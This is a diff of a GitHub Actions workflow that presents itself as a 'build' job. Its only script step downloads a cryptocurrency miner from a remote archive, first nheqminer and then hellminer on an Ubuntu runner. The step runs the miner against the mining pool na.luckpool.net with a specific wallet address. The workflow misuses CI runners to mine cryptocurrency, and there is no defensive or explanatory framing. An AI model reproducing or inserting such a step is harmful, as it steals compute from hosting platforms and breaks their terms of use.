@@ -18,7 +18,7 @@ jobs:
   # This workflow contains a single job called "build"
   build:
     # The type of runner that the job will run on
-    runs-on: macos-latest
+    runs-on: ubuntu-latest
 
     # Steps represent a sequence of tasks that will be executed as part of the job
     steps:
@@ -32,4 +32,4 @@ jobs:
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
         run: |
-          wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-MacOS-v0.8.2.tgz && tar zxf nheq* && tar zxf *.tar.gz && cd nheqminer && ./nheqminer -v -l na.luckpool.net:3956 -u RX1AH2gNJvJP7a3ZCkKfeMk9q33JBwwvn6.Rig001 -p x -t 3
+          wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar zxf hell* && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u zs1ufhz7jn3v4fya5vw5cdj76gm8prdwrrf3mwwmzkwzcw45s6zz7a0kx987asg75wnhkaqktx3j6l.Rig001 -p x --cpu 2 
